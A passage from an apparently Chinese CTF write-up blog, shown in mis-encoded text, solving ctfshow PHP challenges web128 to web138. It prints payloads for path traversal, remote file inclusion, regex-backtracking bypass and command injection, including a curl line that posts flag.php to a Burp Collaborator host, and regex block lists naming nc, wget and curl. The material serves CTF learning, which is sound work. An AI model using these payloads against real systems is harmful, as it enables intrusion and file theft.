<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;ctfshownb&quot;</span>);</span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœï¼šctfshownb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;ctfshownb&quot;</span>);</span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœï¼šctfshownb</span></span><br></pre></td></tr></table></figure>
<p>å› æ­¤<code>call_user_func('_','ctfshownb')</code> è¿”å›çš„ç»“æœä¸ºctfshownbï¼Œæ¥ä¸‹æ¥åˆ°ç¬¬äºŒå±‚<code>call_user_func</code>ï¼Œæ‰¾äº†ä¸€åœˆå‘ç°<code>get_defined_vars</code>å‡½æ•°å¯ä»¥ä½¿ç”¨</p>
<blockquote>
<p><strong>get_defined_vars ( void ) : array</strong> å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</p>
</blockquote>
<p>æ‰€ä»¥payloadä¹Ÿå°±å‡ºæ¥äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</span><br></pre></td></tr></table></figure>
<p>æ•´ä¸ªæ‰§è¡Œæµç¨‹å°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">var_dump(call_user_func(call_user_func(_,&#39;get_defined_vars&#39;)));</span><br><span class="line">var_dump(call_user_func(get_defined_vars));&#x2F;&#x2F;è¾“å‡ºæ•°ç»„</span><br></pre></td></tr></table></figure>
<h3 id="web129"><a class="header-anchor" href="#web129">Â¶</a>web129</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>å€’æ˜¯å˜å¾—ç®€å•äº†ï¼Œä¼ å…¥getå‚æ•°fï¼Œå¹¶ä¸”å­—ç¬¦ä¸²ä¸­åŒ…å«ctfshowå°±ä¼šè¯»å–æ–‡ä»¶ï¼Œæ‰€ä»¥æœ‰å¤šç§åˆ©ç”¨å§¿åŠ¿ï¼Œè¿™é‡Œè®²å‡ ç§<br>
<strong>ç¬¬ä¸€ç§</strong><br>
ç›´æ¥æ–‡ä»¶åŒ…å«</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>ç„¶åå³é”®æºç æŸ¥çœ‹flag<br>
<strong>ç¬¬äºŒç§</strong><br>
è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå†™ä¸€å¥è¯æœ¨é©¬è¿›è¡Œåˆ©ç”¨ï¼Œurlä¸ºä½ çš„æœåŠ¡å™¨ipæˆ–è€…åŸŸåï¼Œxxxx.txtä¸ºä½ å†™çš„ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;http:&#x2F;&#x2F;url&#x2F;xxxx.txt?ctfshow</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬ä¸‰ç§</strong><br>
ä½¿ç”¨phpä¼ªåè®®è¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web130"><a class="header-anchor" href="#web130">Â¶</a>web130</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>é¢ï¼Œè¿™é¢˜ç›´æ¥å°±ctfshowå°±è¿‡äº†ï¼Œå› ä¸ºæ­£åˆ™æ¨¡å¼åŒ¹é…ä¸åˆ°ï¼Œç„¶å<code>stripos()</code>æœç´¢å­—ç¬¦ä¸²è¿”å›çš„å€¼æ˜¯0(å› ä¸ºctfshowç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®å°±æ˜¯0ä¸‹æ ‡)ä¹Ÿè·³è¿‡äº†ifé‡Œçš„è¯­å¥ç›´æ¥è¾“å‡ºflagï¼Œæ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">f&#x3D;ctfshow</span><br></pre></td></tr></table></figure>
<p>ä½†è¿˜æ˜¯è®²ä¸€ä¸‹è¿™é¢˜æœ¬æ¥çš„è€ƒç‚¹ï¼Œæç¤ºveryåº”è¯¥è€ƒçš„æ˜¯æ­£åˆ™çš„æœ€å¤§å›æº¯</p>
<blockquote>
<p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>
å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ false</p>
</blockquote>
<p>å†™ä¸€ä¸ªè„šæœ¬æ¥å‘åŒ…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/27 17:52</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;dotast&#x27;</span>*<span class="number">170000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<h3 id="web131"><a class="header-anchor" href="#web131">Â¶</a>web131</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡åŠ äº†stringå‡½æ•°ï¼Œç”¨ä¸Šé¢˜è„šæœ¬æ”¹ä¸€ä¸‹å°±å¯ä»¥ï¼Œä¸€æ ·åˆ©ç”¨æ­£åˆ™çš„å›æº¯æ¬¡æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/27 17:52</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9b9aa879-e1b7-4f83-9c38-ea3132ac969b.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;dotast&#x27;</span>*<span class="number">170000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œè„šæœ¬å³å¯å¾—åˆ°flag</p>
<h3 id="web132"><a class="header-anchor" href="#web132">Â¶</a>web132</h3>
<p>æ‰“å¼€æ˜¯ä¸€ä¸ªå”¬äººçš„ç½‘é¡µ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/VB1O0E%5D4QT%7DGFT84LA46C4V.png" alt=""><br>
åœ¨robots.txté‡Œçœ‹åˆ°æç¤ºadmin<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/BHY24X%7D%7B8UE3%25KI9%29%7BHIC%7D7.png" alt=""><br>
è®¿é—®åçœ‹åˆ°æºç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/2PD47HLQ_YS5_%29MS%7BY18%25%25R.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $username = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $code = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($code === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; $password === $flag || $username ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($code == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>ä¸‰ä¸ªgetå‚æ•°ï¼Œå¹¶ä¸”æœ‰ä¸ªifåˆ¤æ–­æ¡ä»¶ï¼›phpè¿ç®—ç¬¦ä¼˜å…ˆçº§ <code>||</code>ä¼˜å…ˆçº§ä½äº<code>&amp;&amp;</code>ï¼Œçœ‹ä¸ªç®€å•ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;   <span class="comment">//ä¹Ÿå°±æ˜¯(flase || true)</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">667</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœï¼š666</span></span><br></pre></td></tr></table></figure>
<p>é€»è¾‘ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ»¡è¶³<code>username=admin</code>è¿‡ç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œ<code>code=admin</code>æ»¡è¶³ç¬¬äºŒä¸ªifæ¡ä»¶å³å¯ï¼Œpaylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;code&#x3D;admin&amp;password&#x3D;dotast</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/%24V_8VKNGG6%5DXJ%5BO2%40NV%7D9%60G.png" alt=""></p>
<h3 id="web133"><a class="header-anchor" href="#web133">Â¶</a>web133</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé™åˆ¶äº†ä¸€äº›å‘½ä»¤æ‰§è¡Œè¯­å¥å¹¶ä¸”è¿˜é™åˆ¶äº†6ä¸ªæ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡å–å¥—å¨ƒçš„æ–¹å¼æ¥è·å¾—æ›´å¤šæ§åˆ¶è¯­å¥çš„ç©ºé—´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getä¼ å‚ï¼šF&#x3D;&#96;$F &#96;;sleep 6</span><br><span class="line"></span><br><span class="line">ç»è¿‡substr($F,0,6)æˆªå–å å¾—åˆ° &#96;$F &#96;; ä¸€å…±6ä¸ªå­—ç¬¦,ä¹‹å‰è¯´è¿‡&#96;&#96;åå¼•å·ç­‰äºshell_execæ‰§è¡Œå‘½ä»¤</span><br><span class="line">eval(&quot;&#96;$F &#96;;sleep 6&quot;); </span><br><span class="line">è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„&#96;$F &#96;;sleep 6 æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯&#96;&#96;$F&#96;;+sleep 3&#96;</span><br><span class="line">è¿™æ ·å°±æˆåŠŸæ‰§è¡Œäº† sleep 6ï¼Œå¯ä»¥çœ‹åˆ°å‘åŒ…åå»¶é•¿äº†6ç§’å·¦å³</span><br><span class="line">å‰é¢çš„å‘½ä»¤æ˜¯æ‰§è¡Œæˆ‘ä»¬çš„$Fï¼Œåé¢çš„å‘½ä»¤æˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰$Fè¯­å¥</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé¦–å…ˆæ‰“å¼€burpsuiteé‡Œçš„Collaborator Client<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web133/%5BJ8M4TZG%7B09R%28%5BFYR_0I6%7D8.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web133/Z%5B%5BK%29X0Y%29B%28LG%40%28%60T%28P8%5B0Y.png" alt=""><br>
payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?F&#x3D;&#96;$F &#96;;curl -X POST -F aaa&#x3D;@flag.php gn7nld7jteju8f8ww19yhgwfc6ix6m.burpcollaborator.net</span><br></pre></td></tr></table></figure>
<h3 id="web134"><a class="header-anchor" href="#web134">Â¶</a>web134</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key1 = <span class="number">0</span>;</span><br><span class="line">$key2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key1 == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; $key2 == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°<code>parse_str()</code>å‡½æ•°å’Œ<code>extract()</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹å¾—å‡ºæ˜¯å˜é‡è¦†ç›–ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å‰é¢çš„é¢˜éƒ½è®²è¿‡äº†ï¼Œæˆ‘ä»¬å†ç®€å•è®²ä¸€ä¸‹æµç¨‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæˆ‘ä»¬ä¼ å…¥?_POST[a]=dotastï¼Œå°±ä¼šè¾“å‡º<code>array(1) &#123; [&quot;a&quot;]=&gt; string(6) &quot;dotast&quot; &#125;</code>ï¼Œå†ä½¿ç”¨extractå‡½æ•°ï¼Œå°±ä¼šå˜æˆ<code>$a=dotast</code><br>
æ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</span><br></pre></td></tr></table></figure>
<h3 id="web135"><a class="header-anchor" href="#web135">Â¶</a>web135</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>åœ¨web133åŸºç¡€ä¸Šå¤šbanäº†å¾ˆå¤šå‡½æ•°ï¼Œcpå¤åˆ¶åˆ°èƒ½è®¿é—®çš„æ–‡æœ¬å°±å¯ä»¥ï¼Œæ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?F&#x3D;&#96;$F &#96;;cp flag.php 2.txt</span><br></pre></td></tr></table></figure>
<h3 id="web136"><a class="header-anchor" href="#web136">Â¶</a>web136</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œbanäº†å¤§é‡å‡½æ•°å’Œå­—ç¬¦ï¼Œä¸è¿‡åœ¨linuxä¸‹è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤tee</p>
<blockquote>
<p>Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶<br>
ç”¨æ³•:<br>
tee file1 file2   //å¤åˆ¶æ–‡ä»¶<br>
ls|tee 1.txt      <a href="//xn--1-006as2hgg48hc72k.xn--txt-x68dy9al71g">//å‘½ä»¤è¾“å‡ºåˆ°1.txtæ–‡ä»¶ä¸­</a></p>
</blockquote>
<p>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ls &#x2F;|tee dotast</span><br></pre></td></tr></table></figure>
<p>æ¥ç€è®¿é—®dotastè¿›è¡Œä¸‹è½½<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web136/%2892T~FC5~751I%7B%29T%25R%28HKJ6.png" alt=""><br>
è¯»å–f149_15_h3r3æ–‡ä»¶åˆ°dotastä¸­ï¼Œç»§ç»­ä¸‹è½½æŸ¥çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web136/%25VRI%2409%2915%25TXNSU%40FKZ~BN.png" alt=""><br>
å¾—åˆ°flag</p>
<h3 id="web137"><a class="header-anchor" href="#web137">Â¶</a>web137</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure>
<p>æ²¡æœ‰éš¾åº¦ï¼Œå°±æ˜¯ç›´æ¥è°ƒç”¨ctfshowç±»ä¸­çš„getFlagæ–¹æ³•å°±å¥½ï¼Œpaylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">ctfshow&#x3D;ctfshow::getFlag</span><br></pre></td></tr></table></figure>
<p>è®°å¾—å³é”®æŸ¥çœ‹æºç </p>
<h3 id="web138"><a class="header-anchor" href="#web138">Â¶</a>web138</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strripos($_POST[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure>
<p>åœ¨å‰ä¸€é¢˜åŸºç¡€ä¸ŠæŠŠå†’å·ç»™banäº†ï¼Œä½†<code>call_user_func</code>æ”¯æŒä¼ å…¥æ•°ç»„å½¢å¼</p>
<blockquote>
<p>call_user_func(array($ctfshow, â€˜getFlagâ€™));<br>
è¿™æ—¶å€™ä¼šè°ƒç”¨ctfshowä¸­çš„getFlagæ–¹æ³•</p>
</blockquote>
<p>æ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<h3 id="web139"><a class="header-anchor" href="#web139">Â¶</a>web139</h3>
